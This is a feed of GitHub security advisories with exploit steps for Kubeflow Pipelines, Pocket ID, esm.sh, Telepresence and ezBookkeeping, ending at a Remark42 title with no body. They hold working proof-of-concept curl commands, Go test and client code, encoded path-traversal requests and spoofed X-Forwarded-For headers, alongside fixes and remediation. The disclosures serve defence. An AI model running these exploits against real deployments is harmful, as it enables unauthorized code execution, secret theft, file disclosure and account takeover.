entry.title: [github.com/kubeflow/pipelines] Kubeflow Pipelines API server lacks authorization for shared pipeline uploads
entry.content:
Summary

In multi-user mode, the Kubeflow Pipelines API server's HTTP multipart upload endpoints (POST /apis/v2beta1/pipelines/upload and POST /apis/v2beta1/pipelines/upload_version) perform no authorization when the target namespace is empty. The authorization helper canUploadVersionedPipeline returns nil, skipping SubjectAccessReview, whenever the resolved namespace is the empty string (backend/src/apiserver/server/pipeline_upload_server.go:401-403). An empty namespace is how KFP addresses shared, cluster-wide pipelines and is the default whenever the caller omits the namespace query parameter, because REQUIRE_NAMESPACE_FOR_PIPELINES defaults to false and is unset in every shipped manifest. As a result, an arbitrary low-privilege tenant (or, when the API server is reachable, an unauthenticated caller) can create cluster-shared pipelines and inject new versions into existing shared pipelines, replacing the container image, command, and args that other tenants execute. The gRPC sibling for the same write, canAccessPipeline, instead remaps the empty namespace to the system namespace and authorizes, with a comment stating shared-pipeline writes "must still be authorized". That confirms this is an omission, not intended behavior.

Description

uploadPipeline and uploadPipelineVersion both build a ResourceAttributes{Verb: create} and delegate the access decision to canUploadVersionedPipeline:

// backend/src/apiserver/server/pipeline_upload_server.go:387-421
func (s *PipelineUploadServer) canUploadVersionedPipeline(r *http.Request, pipelineID string, resourceAttributes *authorizationv1.ResourceAttributes) error {
    if !common.IsMultiUserMode() {
        return nil
    }
    if len(pipelineID) > 0 {
        namespace, err := s.resourceManager.FetchNamespaceFromPipelineId(pipelineID)
        if err != nil {
            return util.Wrap(err, "Failed to authorize with the Pipeline ID")
        }
        if len(resourceAttributes.Namespace) == 0 {
            resourceAttributes.Namespace = namespace
        }
    }
    if resourceAttributes.Namespace == "" {
        return nil          // empty namespace = no SubjectAccessReview
    }
    // ... only here does IsAuthorized() run ...
}

When the namespace is empty (a shared/cluster-wide pipeline, or simply an upload with no namespace parameter), the function returns at line 401-403 and IsAuthorized is never reached.

Reachability is the default. ValidateNamespaceRequired only rejects an empty namespace when IsNamespaceRequiredForPipelines() is true:

// backend/src/apiserver/validation/namespace.go:25-30
func ValidateNamespaceRequired(namespace string) error {
    if common.IsMultiUserMode() && common.IsNamespaceRequiredForPipelines() && namespace == "" {
        return util.NewInvalidInputError("Namespace is required for pipeline operations")
    }
    return nil
}
// backend/src/apiserver/common/config.go:73-74  -> default FALSE
func IsNamespaceRequiredForPipelines() bool {
    return GetBoolConfigWithDefault(RequireNamespaceForPipelines, false)
}

REQUIRE_NAMESPACE_FOR_PIPELINES (config.go:41) defaults to false and is not set in any manifest under manifests/. So in a default multi-user install, empty namespaces pass validation and flow into the unguarded branch.

The gRPC sibling proves the intended behavior is to authorize empty-namespace writes:

// backend/src/apiserver/server/pipeline_server.go:1290-1306 (canAccessPipeline)
    // Skip authorization for read-only operations on shared pipelines in multi-user mode.
    // Write operations (create, update, delete) on shared pipelines must still be authorized
    // against the KFP system namespace, since shared pipelines have no namespace of their own.
    if s.resourceManager.IsEmptyNamespace(resourceAttributes.Namespace) {
        if resourceAttributes.Verb == common.RbacResourceVerbGet || resourceAttributes.Verb == common.RbacResourceVerbList {
            return nil
        }
        resourceAttributes.Namespace = common.GetPodNamespace()
        // ... IsAuthorized(...) ...
        return nil
    }

Reads of shared pipelines intentionally skip authorization; writes must be authorized against the system namespace. The upload endpoints only ever perform writes, yet canUploadVersionedPipeline applies the read behavior to them.

Proof of Concept

Reproduced live against the real API server binary (ghcr.io/kubeflow/kfp-api-server@sha256:621fdae9bfcc93405eca299c24f715bc7f17dbb76f1b53e8b2b35852e4d7d423, MULTIUSER=true, REQUIRE_NAMESPACE_FOR_PIPELINES unset). The API server SA holds subjectaccessreviews/tokenreviews: [create] (authz fully functional); identity attacker@evil.com has no RBAC anywhere; victim-ns exists with no grant to the attacker.

  1. Shared (empty-namespace) pipeline create as the unprivileged attacker (HTTP 200):
    curl -F uploadfile=@pipeline.yaml -H "kubeflow-userid: attacker@evil.com" \
  "http://APISERVER:8888/apis/v2beta1/pipelines/upload?name=shared-pwn"
-> {"pipeline_id":"80cd99df-...","name":"shared-pwn", ...}
  2. Inject a new version into that shared pipeline, the high-impact primitive (HTTP 200):
    curl -F uploadfile=@pipeline2.yaml -H "kubeflow-userid: attacker@evil.com" \
  "http://APISERVER:8888/apis/v2beta1/pipelines/upload_version?name=evilversion&pipelineid=80cd99df-..."
-> {"pipeline_version_id":"32299f65-...","name":"evilversion","pipeline_spec":{ attacker IR }}
  3. Same create with no identity header at all: HTTP 200 (anon-shared-pwn created).
  4. Negative control, same attacker, &namespace=victim-ns (real namespace, no RBAC): HTTP 400, rejected at pipeline_upload_server.go:135 (the canUploadVersionedPipeline error path). Authorization is live; only the empty-namespace branch bypasses it.
  5. Asymmetry, gRPC POST /apis/v2beta1/pipelines with empty namespace as the same attacker: HTTP 403 PermissionDenied (ResourceAttributes{Namespace:kubeflow,Verb:create,...}). The gRPC path remapped empty to the system namespace and authorized.

API server logs corroborate: every empty-namespace upload logs Upload pipeline called with no following Authorizing request, while every namespaced upload and every gRPC create logs Authorizing request then PermissionDenied. Database state persists the attacker's shared-pwn and anon-shared-pwn pipelines and the injected evilversion; the denied ns-pwn created nothing.

Full scaffolding (run.sh, 01-mysql.yaml through 05-apiserver.yaml, pipeline.yaml, pipeline2.yaml) and captured evidence are available on request.

Impact

In multi-user deployments that permit shared pipelines, a low-privilege tenant can create shared pipelines or add attacker-controlled versions to existing shared pipelines without the required write permission. Direct access to the API server without an authenticating proxy can also expose the bypass to unauthenticated callers; the CVSS vector below assesses the authenticated tenant scenario.

An attacker can upload a malicious version of an existing shared pipeline consumed by a recurring run configured to follow the latest version. On its next scheduled execution, the controller resolves the newly uploaded version and executes it in the consuming run's namespace using its configured service account, without further user interaction. Recurring runs pinned to a specific version or containing an embedded specification are not subject to this automatic substitution.

This automatic path requires an enabled, unpinned recurring run consuming the targeted shared pipeline and an uploaded specification compatible with the run's inputs. Latest-version selection queries the newest ready pipeline version; it does not depend on the UpdatePipelineVersionByDefault setting.

The automatic execution path was verified by source inspection, including the 2.17.2 tag: recurring-run creation preserves an unpinned pipeline reference, the scheduled-workflow controller submits it to CreateRun, and the API resolves the latest version before constructing the workflow. This is distinct from the live upload-bypass reproduction above; an end-to-end scheduled victim-execution reproduction has not been performed as part of this maintainer assessment.

Execution occurs with the victim workload's permissions and access to its mounted data and credentials. It can compromise confidential data and execution integrity available to that workload. It does not inherently grant access to every secret in the victim namespace or cluster-admin privileges.

CVSS rationale

The retained CVSS v3.1 vector is 9.6 Critical — CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N.

  • AV:N / AC:L / PR:L: an authenticated low-privilege tenant can submit a normal multipart version upload targeting a shared pipeline, without shared-pipeline write permission.
  • UI:N: an existing unpinned recurring run can consume the injected version automatically; no further victim action is required.
  • S:C: the scored consequence extends from unauthorized modification of the shared pipeline catalog to code execution under a separate victim workload's Kubernetes namespace and service-account authority, not merely modification of another catalog entry.
  • C:H / I:H: attacker-controlled workload code can compromise the confidentiality and integrity of resources available under that victim execution authority. These impacts do not imply cluster-wide access.
  • A:N: this vector does not claim an independently established availability impact.

Patches / Remediation

The fix merged into master on September 9, 2026 in kubeflow/pipelines#14352, commit 62516d8c525f146b754cb515cf441dd0290ad841.

The upload authorization helper now uses ResourceManager.IsEmptyNamespace to recognize both the empty string and the legacy model.NoNamespace ("-") representation of shared pipelines. It checks shared writes against the configured KFP system namespace through IsAuthorized, requiring create on the pipelines resource in the pipelines.kubeflow.org API group. This matches the gRPC shared-write policy without changing the stored pipeline namespace. Namespaced authorization, single-user behavior, and intentional latest-version scheduling remain unchanged.

The original fix by Vito Carolillo (@vcrll) was carried forward with its authorship and DCO sign-off preserved. Separate maintainer commits added regression coverage, sentinel handling, and test-harness compatibility corrections.

Validation

  • 32 endpoint regression cases cover both v1beta1 and v2beta1 pipeline and pipeline-version uploads: allowed and denied shared writes (empty and sentinel namespaces), namespaced writes, and single-user behavior. Tests verify exact SubjectAccessReview attributes and preservation of stored namespaces.
  • A negative control restoring the original early return caused the new shared-upload tests to fail, including denied requests returning HTTP 200 without an authorization check.
  • The full server unit-test package and changed-package lint passed during remediation.
  • E2E test clients were corrected to send their generated authentication token and target the tenant namespace for HTTP uploads. Kubernetes-native clients retain their constructor-configured namespace rather than receiving an unsupported upload parameter. Helper regression tests and E2E/API package compilation passed.

Release status and upgrade guidance

The first fixed release is 2.18.0. Releases through 2.17.3 remain affected; the affected-version upper bound is <= 2.17.3 and the patched version is 2.18.0.

The 2.18 RBAC and client migration guide is included through PR #14655. Related trusted-scheduling changes do not replace upload authorization or remove previously uploaded versions. Roll out the matching server/manifests and review existing shared versions and schedules.

In multi-user deployments, callers that previously relied on unauthenticated or unauthorized shared uploads will now be rejected:

  • UI: choose Private (the default in the upload dialog) for tenant-owned pipelines. Shared uploads require an authorized shared-pipeline writer.
  • Python SDK: explicitly pass the tenant namespace, for example client.upload_pipeline("pipeline.yaml", namespace="my-namespace"). Setting Client(namespace=...) alone does not populate this upload argument.
  • New versions: inherit the existing pipeline's namespace. Existing shared pipelines must be maintained by an identity with the required system-namespace pipeline permission, or re-uploaded as new namespaced pipelines with consuming runs and schedules repointed.
  • Kubernetes-native uploads: retain their existing client-configured namespace contract.

Do not grant blanket system-namespace access or restore the authorization bypass to preserve old upload scripts. Grant only the required pipeline-write permission to designated shared-pipeline maintainers.

As an interim hardening measure before deploying the fix, operators can set REQUIRE_NAMESPACE_FOR_PIPELINES=true to reject empty-namespace pipeline operations, with the corresponding compatibility impact on shared uploads.

Restoring upload authorization does not remove previously uploaded malicious versions or migrate existing pipelines and runs. Operators should review shared-pipeline versions and consuming recurring runs for unauthorized changes; pinning to a reviewed version prevents subsequent latest-version substitution.

The visualization authorization issue is tracked separately in GHSA-w9j6-6675-75m4 and is outside this fix's scope.

Resources

  • backend/src/apiserver/server/pipeline_upload_server.go:387-421 (canUploadVersionedPipeline; bypass at :401-403), :118-138, :290-312
  • backend/src/apiserver/server/pipeline_server.go:1290-1306 (canAccessPipeline; load-bearing comment :1290-1292)
  • backend/src/apiserver/validation/namespace.go:25-30
  • backend/src/apiserver/common/config.go:41, :73-74
  • backend/src/apiserver/resource/resource_manager.go (CreateJob, fetchPipelineVersionFromPipelineSpec, CreateRun)
  • backend/src/crd/controller/scheduledworkflow/controller.go (submitNewWorkflowIfNotAlreadySubmitted)
  • backend/src/apiserver/storage/pipeline_store.go (GetLatestPipelineVersion)
  • Distinct from CVE-2023-6570 and CVE-2023-6571 (both in kubeflow/kubeflow, different components and classes).

Maintainer disposition

This is the canonical advisory for the shared pipeline upload authorization family. Related submissions closed as duplicates or superseded by this canonical:

  • GHSA-87q5-j5jh-fhp8

Each linked submission retains its own reporter attribution. A cross-link does not transfer authorship or grant co-reporter credit on this advisory. The fix merged through #14352 on September 9, 2026. The fix is available in 2.18.0. This advisory remains a maintained draft pending publication; CVE-2026-77596 and the 9.6 CVSS score are unchanged.

Private patch disposition

The earlier private PR #1 is closed as superseded by public PR #14352 and the released follow-ups described above. The private branch and review history are retained; this closure does not dismiss the report or change reporter credit. The advisory remains a draft pending the publication review.

entry.title: [github.com/pocket-id/pocket-id/backend] Pocket ID: Email verification token remains valid after address change, enabling arbitrary verified-email spoofing
entry.content:
Summary

An authenticated Pocket ID user can request an email-verification token while their account uses an address they control, change the account email address, and then redeem the previously issued token. The token is bound only to the user ID, not to the address to which it was sent, and changing the address does not revoke outstanding tokens.

As a result, Pocket ID marks the newly supplied address as verified even though the user never proved control of it. Pocket ID subsequently returns that address with email_verified: true in OIDC claims. A relying party that trusts this claim for email-based account linking or provisioning can therefore link the attacker's Pocket ID identity to a victim's existing account, leading to cross-application account takeover.

This was verified against commit 9f559788a44cfea790de360da0a74d4bdf8ca5d5.

Preconditions

  • The attacker has an ordinary Pocket ID user account.
  • Email verification is in use (emailsVerified=false, which is the default).
  • The user can edit their own account (allowOwnAccountEdit=true, which is the default).
  • The target address is not already assigned to another Pocket ID user.
  • For downstream account takeover, a relying party links or provisions users based on a trusted, verified email address. Applications that rely exclusively on the stable OIDC sub claim are not affected by that downstream consequence.

No administrator privilege, victim interaction, or access to the victim's mailbox is required.

Reproduction through the API

  1. Sign in as an ordinary user whose current email address is controlled by the attacker, for example attacker@example.test.
  2. Call POST /api/users/me/send-email-verification.
  3. Obtain the token from the message delivered to attacker@example.test, but do not redeem it yet.
  4. Call PUT /api/users/me and change the account email to an address the attacker does not control, for example victim@example.test.
  5. Observe that the new address is initially stored with emailVerified: false.
  6. Call POST /api/users/me/verify-email with the token delivered to attacker@example.test.
  7. Call GET /api/users/me. The current address is now victim@example.test and emailVerified is true.
  8. Complete an OIDC flow with the email scope. Pocket ID emits:
{
  "email": "victim@example.test",
  "email_verified": true
}

The old token has therefore verified a different address from the one to which it was delivered.

Executable regression test / proof of concept

Save this as backend/internal/service/audit_email_verification_test.go and run:

go test -tags=exclude_frontend,unit ./internal/service -run TestAuditEmailVerificationTokenSurvivesEmailChange -count=1 -v

The test passes on the referenced commit and demonstrates the unintended state transition:

package service

import (
    "testing"
    "time"

    "github.com/stretchr/testify/require"

    "github.com/pocket-id/pocket-id/backend/internal/appconfig"
    "github.com/pocket-id/pocket-id/backend/internal/dto"
    "github.com/pocket-id/pocket-id/backend/internal/model"
    datatype "github.com/pocket-id/pocket-id/backend/internal/model/types"
)

func TestAuditEmailVerificationTokenSurvivesEmailChange(t *testing.T) {
    userService, _ := newTestUserService(t)
    config := &appconfig.AppConfigModel{
        RequireUserEmail:    "true",
        AllowOwnAccountEdit: "true",
        EmailsVerified:      "false",
    }

    attackerEmail := "attacker-controlled@example.test"
    user, err := userService.CreateUser(t.Context(), config, dto.UserCreateDto{
        Username:      "attacker",
        Email:         &attackerEmail,
        EmailVerified: false,
    })
    require.NoError(t, err)

    const tokenFromAttackerMailbox = "token-issued-for-attacker-email"
    require.NoError(t, userService.db.Create(&model.EmailVerificationToken{
        UserID:    user.ID,
        Token:     tokenFromAttackerMailbox,
        ExpiresAt: datatype.DateTime(time.Now().Add(time.Hour)),
    }).Error)

    victimEmail := "victim@example.test"
    _, err = userService.UpdateUser(t.Context(), config, user.ID, dto.UserCreateDto{
        Username: user.Username,
        Email:    &victimEmail,
    }, true, false)
    require.NoError(t, err)

    changed, err := userService.GetUser(t.Context(), user.ID)
    require.NoError(t, err)
    require.Equal(t, victimEmail, *changed.Email)
    require.False(t, changed.EmailVerified)

    require.NoError(t, userService.VerifyEmail(
        t.Context(),
        user.ID,
        tokenFromAttackerMailbox,
    ))

    verified, err := userService.GetUser(t.Context(), user.ID)
    require.NoError(t, err)
    require.Equal(t, victimEmail, *verified.Email)
    require.True(t, verified.EmailVerified)
}

Observed result:

=== RUN   TestAuditEmailVerificationTokenSurvivesEmailChange
--- PASS: TestAuditEmailVerificationTokenSurvivesEmailChange
PASS

Root cause

backend/internal/model/email_verification_token.go stores only a token, expiration, and user ID. It does not store or cryptographically bind the address being verified.

UserService.SendEmailVerification creates the token for user.ID and sends it to the current user.Email, but that email is not part of the token record:

emailVerificationToken := &model.EmailVerificationToken{
    UserID:    user.ID,
    Token:     randomToken,
    ExpiresAt: datatype.DateTime(expiration),
}

UserService.UpdateUser resets the verification flag when the address changes but leaves existing verification tokens valid.

UserService.VerifyEmail validates only the token, user ID, and expiry, then sets EmailVerified on the user's current record:

err := tx.WithContext(ctx).Where(
    "token = ? AND user_id = ? AND expires_at > ?",
    token,
    userID,
    datatype.DateTime(time.Now()),
).First(&emailVerificationToken).Error

user, err := s.getUserInternal(ctx, emailVerificationToken.UserID, tx)
// ...
user.EmailVerified = true

Finally, backend/internal/oidc/claims_service.go publishes the current address and flag together:

claims["email"] = *user.Email
claims["email_verified"] = user.EmailVerified

Impact

The direct impact is an authentication-integrity failure in an identity provider: any ordinary user can cause Pocket ID to attest control of an arbitrary unused email address.

The security boundary crossed by that false attestation is the relying application. Where a relying party treats email_verified=true as proof of address ownership and uses email for automatic account matching, the attacker can be signed into or linked to the victim's existing relying-party account. This can expose all data and actions available through that account.

Suggested remediation

  1. Store a normalized target email address (or a keyed hash of it) with every verification token.
  2. During redemption, atomically require that the stored target address still equals the user's current normalized email address.
  3. Invalidate all outstanding email-verification tokens whenever the account email changes.
  4. Invalidate prior outstanding tokens when issuing a replacement token.
  5. Add a regression test that changes the email after issuance and requires the old token to be rejected.

Testing note

Source review and test construction were AI-assisted. The finding, affected control flow, preconditions, and executable proof of concept were validated against the referenced Pocket ID commit before submission.

References

  • https://github.com/pocket-id/pocket-id/security/advisories/GHSA-rm8c-2cv8-jwf6
  • https://nvd.nist.gov/vuln/detail/CVE-2026-115770
  • https://github.com/pocket-id/pocket-id/pull/1625
  • https://github.com/pocket-id/pocket-id/commit/43aaccd5bfacb76283b11ce039fb3f0716196fcb
  • https://github.com/pocket-id/pocket-id/releases/tag/v2.12.0
  • https://github.com/advisories/GHSA-rm8c-2cv8-jwf6

entry.title: [github.com/esm-dev/esm.sh/web] esm.sh: web.NewHandler allows arbitrary file read via encoded dot-segment path traversal
entry.content:
Summary

The documented web.NewHandler static file server can read files outside Config.AppDir when the request path contains URL-encoded dot-segments such as %2e%2e. Go's ServeMux redirects plain /../ paths, but it passes encoded dot-segments to the handler after decoding r.URL.Path. The handler then calls filepath.Join(s.config.AppDir, r.URL.Path) without checking that the result remains under AppDir, allowing unauthenticated arbitrary file reads with the server process privileges.

Details

web/README.md:34-40 documents a network-facing setup:

http.Handle("GET /", web.NewHandler(web.Config{
  AppDir: "/path/to/webapp",
  Fallback: "/index.html",
  Dev: false,
}))
log.Fatal(http.ListenAndServe(":8080", nil))

In web/handler.go:62-75, the handler takes r.URL.Path and joins it directly with s.config.AppDir:

pathname := r.URL.Path
filename := filepath.Join(s.config.AppDir, pathname)
fi, err := os.Lstat(filename)

Later the same resolved filename is opened and copied to the response in web/handler.go:150-166 for non-HTML/static files. There is no filepath.IsLocal, cleaned-relative-path, absolute-root prefix, or symlink-aware containment check before opening the file.

A plain /../secret.txt path is redirected by Go's ServeMux, but an encoded path such as /%2e%2e/secret.txt is decoded into r.URL.Path == "/../secret.txt" and reaches the handler. On Linux, filepath.Join("/tmp/root/app", "/../secret.txt") resolves to /tmp/root/secret.txt, outside the configured app directory.

Source-to-sink chain:

Unauthenticated HTTP request path containing URL-encoded dot-segments
-> net/http decodes path into r.URL.Path
-> documented ServeMux setup passes encoded dot-segment path to web.NewHandler
-> web/handler.go joins Config.AppDir with r.URL.Path
-> os.Lstat/os.Open operate on the escaped path
-> io.Copy returns file contents to the attacker

False-positive checks performed:

  • Plain dot-segment paths are redirected by http.ServeMux, but encoded dot-segments are not blocked and reach the handler.
  • The PoC uses the documented http.Handle("GET /", web.NewHandler(...)) setup, not a custom bypass of ServeMux.
  • A control request for /secret.txt does not read the outside file; the disclosure requires encoded traversal segments.
  • The issue is independent of Dev/HMR; it reproduces with Dev: false.
  • The root cause appears in other handler paths that join app paths, but the static file read path is sufficient to prove arbitrary file disclosure.

Candidate score: 18/18 under the local audit scoring rubric. The handler is documented for network-facing use, the attacker directly controls the request path, the path reaches os.Open, file disclosure was reproduced locally, and no root containment mitigation is present.

PoC

This safe local proof creates an application directory and a sibling secret file outside it, registers the handler exactly as documented, and requests the sibling file through encoded .. path segments.

package main

import (
    "fmt"
    "net/http"
    "net/http/httptest"
    "os"
    "strings"

    "github.com/esm-dev/esm.sh/web"
)

func main() {
    mux := http.NewServeMux()
    mux.Handle("GET /", web.NewHandler(web.Config{AppDir: os.Args[1], Dev: false}))
    for _, target := range []string{
        "http://example/%2e%2e/%2e%2e/%2e%2e/secret.txt",
        "http://example/secret.txt",
    } {
        rr := httptest.NewRecorder()
        req := httptest.NewRequest("GET", target, nil)
        mux.ServeHTTP(rr, req)
        fmt.Printf("%s => status=%d location=%q contains_secret=%v body=%q\n",
            target,
            rr.Code,
            rr.Header().Get("Location"),
            strings.Contains(rr.Body.String(), "ancestor-secret-marker"),
            rr.Body.String(),
        )
    }
}

Maintainer-runnable clean-checkout recipe:

tmp=$(mktemp -d)
mkdir -p "$tmp/root/a/b/app"
printf 'ancestor-secret-marker' > "$tmp/root/secret.txt"
printf '<h1>inside</h1>' > "$tmp/root/a/b/app/index.html"
cat > "$tmp/poc.go" <<'EOF'
[place the PoC above here]
EOF
go run "$tmp/poc.go" "$tmp/root/a/b/app"
rm -rf "$tmp"

Observed vulnerable output in this environment:

http://example/%2e%2e/%2e%2e/%2e%2e/secret.txt => status=200 location="" contains_secret=true body="ancestor-secret-marker"
http://example/secret.txt => status=200 location="" contains_secret=false body="<h1>inside</h1>"

Final re-check after drafting reproduced the same output:

http://example/%2e%2e/%2e%2e/%2e%2e/secret.txt => status=200 location="" contains_secret=true body="ancestor-secret-marker"
http://example/secret.txt => status=200 location="" contains_secret=false body="<h1>inside</h1>"

Additional parser/control evidence observed locally:

http://example/../secret.txt => status=307 loc="/secret.txt"
handler Path="/../secret.txt" RawPath="/%2e%2e/secret.txt"
http://example/%2e%2e/secret.txt => status=204 loc=""
http://example/a/../../secret.txt => status=307 loc="/secret.txt"

This confirms that the documented ServeMux setup redirects plain traversal paths but lets encoded dot-segments reach the handler.

Impact

An unauthenticated remote attacker can read files that are outside the configured web application directory but readable by the server process. Depending on deployment layout and process privileges, this can disclose source files, configuration files, environment-adjacent files, build artifacts, local credentials, private keys, or other application secrets located in ancestor or sibling directories.

The impact is limited to file disclosure in the confirmed path. No write primitive or code execution was confirmed in this audit.

Suggested remediation

Normalize request paths into a cleaned relative path before joining them with AppDir, and reject any path that is not local. A robust pattern is:

  • reject paths containing NUL bytes,
  • use path.Clean("/" + r.URL.EscapedPath()) or an equivalent URL-path canonicalization step,
  • trim the leading slash and reject non-local paths with filepath.IsLocal,
  • join only the validated relative path to AppDir,
  • optionally compare absolute cleaned paths to ensure the result remains inside the absolute app root,
  • consider symlink policy explicitly if symlinks inside AppDir should not escape the app root.

Add regression tests for /%2e%2e/secret.txt, multi-level encoded traversal, plain /../ behavior, and normal in-app file serving.

Credits

  • Thai Son Dinh from VinSOC Labs (R&D)

References

  • https://github.com/esm-dev/esm.sh/security/advisories/GHSA-g3c2-rjq2-c763
  • https://nvd.nist.gov/vuln/detail/CVE-2026-102657
  • https://github.com/esm-dev/esm.sh/pull/1376
  • https://github.com/esm-dev/esm.sh/commit/468b6b2a4b4dfec334cf6b33b01fcd4e5cd93bed
  • https://github.com/esm-dev/esm.sh/commit/fc3b345e73aeaa0b7a05b6f27d91c05fdf5f9b53
  • https://github.com/esm-dev/esm.sh/releases/tag/v0.2.0
  • https://github.com/esm-dev/esm.sh/releases/tag/v137_7
  • https://github.com/advisories/GHSA-g3c2-rjq2-c763

entry.title: [github.com/telepresenceio/telepresence] Telepresence: Traffic Manager gRPC has no auth — any pod claims arbitrary namespace and intercepts services, receiving victim environment secrets
entry.content:
Summary

Telepresence's Traffic Manager gRPC API (port 8081) requires no authentication. Any pod with cluster-network access to the Traffic Manager can register as a client in an arbitrary managed namespace and create intercepts against services in that namespace, regardless of Kubernetes RBAC. On interception the victim pod's complete container environment (secrets, tokens, API keys) is delivered to the attacker. Tested on HEAD v2.28.0, commit b2231a4.

Details

The gRPC server is started with no auth interceptor (pkg/grpc/server/server.go). The connection uses plaintext: grpc.WithTransportCredentials(insecure.NewCredentials()).

ArriveAsClient stores the caller-supplied Namespace without verifying the caller is in that namespace. The only gate is whether the namespace is in the Traffic Manager's watchlist (ManagesNamespace):

// cmd/traffic/cmd/manager/service.go:181-201
func (s *service) ArriveAsClient(..., client *rpc.ClientInfo) (*rpc.SessionInfo, error) {
    if !s.State().ManagesNamespace(ctx, client.Namespace) {
        return nil, status.Error(codes.FailedPrecondition, ...)
    }
    // No SAR, no bearer token, no kubeconfig check
    return &rpc.SessionInfo{SessionId: string(s.state.AddClient(client, ...))}, nil
}

CreateIntercept calls managedTargetNamespace() which also only checks ManagesNamespace(target_ns) — never that the target equals the client's own registered namespace (service.go:929). A session registered in namespace A can intercept namespace B as long as B is also watched. On interception, the victim pod's full container environment is forwarded via intercept.Environment = rIReq.Environment.

Proof of Concept

From any pod in the cluster:

conn, _ := grpc.NewClient("traffic-manager.ambassador:8081",
    grpc.WithTransportCredentials(insecure.NewCredentials()))
mgr := rpc.NewManagerClient(conn)

session, _ := mgr.ArriveAsClient(ctx, &rpc.ClientInfo{
    Name: "attacker@pod", Namespace: "payments",
    InstallId: uuid.NewString(), Product: "telepresence", Version: "2.20.0",
})

mgr.CreateIntercept(ctx, &rpc.CreateInterceptRequest{
    Session: session,
    InterceptSpec: &rpc.InterceptSpec{
        Name: "steal", Agent: "payments-api", Namespace: "payments",
        Mechanism: "tcp", Client: "attacker@pod",
    },
})

Supplying a namespace not in the TM watchlist returns FailedPrecondition, confirming the only gate is the watchlist check.

Impact

Any pod operator in the cluster can intercept services in namespaces they have no Kubernetes RBAC access to, receiving all traffic and environment variables. In the default cluster-wide Traffic Manager deployment all namespaces are managed. Secrets mounted as environment variables (database passwords, API keys, service account tokens) are exfiltrated with no audit trail on the victim namespace.

entry.title: [github.com/telepresenceio/telepresence/v2] Telepresence: Tunnel endpoint accepts caller-supplied session ID with no ownership proof — active client sessions hijackable
entry.content:
Summary

The Traffic Manager Tunnel gRPC streaming endpoint accepts a session ID from the first bytes of the client-controlled message payload. No verification confirms the caller owns the session. An attacker supplying a valid active session ID receives a fully routed tunnel for that session, gaining the network routing capabilities of the legitimate Telepresence client. Tested on HEAD v2.28.0, commit b2231a4.

Details

The Tunnel handler reads identity from a client-provided binary payload rather than from a verified credential or prior authenticated gRPC call:

// cmd/traffic/cmd/manager/service.go:1057-1063
func (s *service) Tunnel(server grpc.BidiStreamingServer[...]) error {
    stream, err := tunnel.NewServerStream(ctx, tunnel.ClientToManager, server)
    return s.state.Tunnel(ctx, stream)  // stream.SessionID() is client-controlled
}

state.Tunnel looks up the session ID in the sessions map with no ownership proof:

// cmd/traffic/cmd/manager/state/state.go:698-703
func (s *State) Tunnel(ctx context.Context, stream tunnel.Stream) error {
    id := stream.SessionID()   // from client payload bytes
    if cs, ok := s.clients.Load(id); ok {
        return s.clientTunnel(ctx, cs, stream)  // full dialer granted
    }
    return grpcErrors.Errorf(codes.NotFound, ...)
}

The session ID is parsed from the wire message with no binding to the transport-level identity of the caller (pkg/tunnel/message.go:209-214).

Proof of Concept

Precondition: a valid active session ID (obtainable via ArriveAsClient, which has no auth either).

conn, _ := grpc.NewClient("traffic-manager.ambassador:8081",
    grpc.WithTransportCredentials(insecure.NewCredentials()))
mgr := rpc.NewManagerClient(conn)

tunnelStream, _ := mgr.Tunnel(ctx)

// Send StreamInfo with victim session ID in payload
tunnelStream.Send(&rpc.TunnelMessage{Payload: buildStreamInfo(victimSessionID, ...)})

// Traffic Manager routes tunnel traffic for victimSessionID
// through this attacker-controlled bidirectional stream

Impact

A caller supplying a valid session ID of an active Telepresence client obtains a tunnel endpoint for that session's network routing context. Session IDs are UUID4s, making cold brute-force impractical; exploitation materialises when session IDs are obtainable via log leakage or cluster-internal channels. Combined with the unauthenticated ArriveAsClient endpoint, an attacker can create their own sessions and pivot to impersonate active developer sessions.

entry.title: [github.com/mayswind/ezbookkeeping] ezBookkeeping: Source-IP allowlist (MCP & API token) is bypassable via a spoofed `X-Forwarded-For` header
entry.content:
Summary

A remote attacker from any IP address defeats the operator-configured source-IP allowlist (mcp_allowed_remote_ips / api_token_allowed_remote_ips) by sending a single X-Forwarded-For: <allowlisted-ip> header. The router is created with gin.New() and never calls SetTrustedProxies, so gin trusts every proxy by default and c.ClientIP() returns the attacker-supplied header verbatim. The same forged value is also written to Transaction.CreatedIp and the access log, so the attacker's real IP never appears in any record.

Details

cmd/webserver.go:104 builds the router with gin.New(). A grep of cmd/ and pkg/ confirms SetTrustedProxies is never called, leaving gin's default trusted-proxy range of 0.0.0.0/0 and ::/0. WebContext (pkg/core/context_web.go:39) embeds *gin.Context and does not override ClientIP().

Both allowlist middlewares match the operator allowlist against this attacker-controlled value:

// pkg/middlewares/mcp_server_ip_limit.go:19
if config.MCPAllowedRemoteIPs[i].Match(c.ClientIP()) { c.Next(); return }

The identical c.ClientIP() is consumed by the audit trail at pkg/api/transactions.go:1078 (createNewTransactionModel(..., c.ClientIP()) → CreatedIp) and the access log (pkg/middlewares/request_log.go:28), so one header both bypasses the gate and forges attribution.

PoC

Runtime PoC (no live deployment required) — pkg/middlewares/xff_bypass_runtime_test.go, pkg/middlewares/xff_chain_runtime_test.go:

go test ./pkg/middlewares/ -run 'TestACCESSCONTROL001_XFFBypass|TestCHAIN_AllowlistBypass' -v

Output:

[control] no XFF, RemoteAddr=1.2.3.4 -> status=400 (correctly blocked)
[exploit] XFF=10.0.0.1, RemoteAddr=1.2.3.4 -> status=200, ClientIP=10.0.0.1 (bypassed)
gate status = 200 | created_ip that would be persisted = "10.0.0.1"

Against a live instance with mcp_allowed_remote_ips=10.0.0.1:

curl -s -o /dev/null -w "%{http_code}\n" https://target/mcp            # 403 (blocked)
curl -s -o /dev/null -w "%{http_code}\n" -H "X-Forwarded-For: 10.0.0.1" https://target/mcp  # passes IP gate

Impact

Defeats an explicitly advertised, operator-configured security control on the MCP and API-token surfaces, from any source IP, with a single header and no authentication to the gate itself. It also destroys non-repudiation: every action is logged under the spoofed allowlisted IP, so audit trails point at the trusted host instead of the attacker. (The MCP/API actions themselves still require a valid token — this neutralizes the compensating IP control, not the JWT layer.)

entry.title: [github.com/umputun/remark42] Remark42: Rate limit bypass via unconditional trust of X-Forwarded-For/X-Real-IP headers in direct-internet deployment
entry.content:
Summary

